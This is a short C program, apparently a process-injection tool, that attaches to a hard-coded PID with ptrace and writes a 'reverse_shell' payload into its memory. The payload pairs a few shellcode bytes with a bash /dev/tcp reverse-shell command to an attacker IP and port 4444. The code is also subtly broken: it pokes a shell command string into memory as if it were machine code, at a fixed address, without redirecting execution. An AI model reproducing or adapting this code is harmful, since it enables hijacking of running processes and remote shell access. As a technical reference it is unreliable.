#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TARGET_PID 4215  
#define ATTACKER_IP "127.0.0.1"  
#define ATTACKER_PORT 4444  

void inject_shellcode(pid_t pid, const char *shellcode, size_t size) {
    long ret;
    for (size_t i = 0; i < size; i += sizeof(long)) {
        memcpy(&ret, shellcode + i, sizeof(long));
        ptrace(PTRACE_POKETEXT, pid, (void *)(0x7f60133ba000 + i), (void *)ret);
    }
}

int main() {
    pid_t target_pid = TARGET_PID;
    char reverse_shell[] =
        "\x48\x31\xc0\x50\x5f\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05/bin/bash -i >& /dev/tcp/"
        ATTACKER_IP "/"
        "4444 0>&1";

    printf("[+] Attaching to process %d\n", target_pid);

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("[-] Failed to attach");
        return 1;
    }
    waitpid(target_pid, NULL, 0);

    printf("[+] Injecting shellcode...\n");
    inject_shellcode(target_pid, reverse_shell, sizeof(reverse_shell));

    printf("[+] Detaching from process\n");
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    return 0;
} 
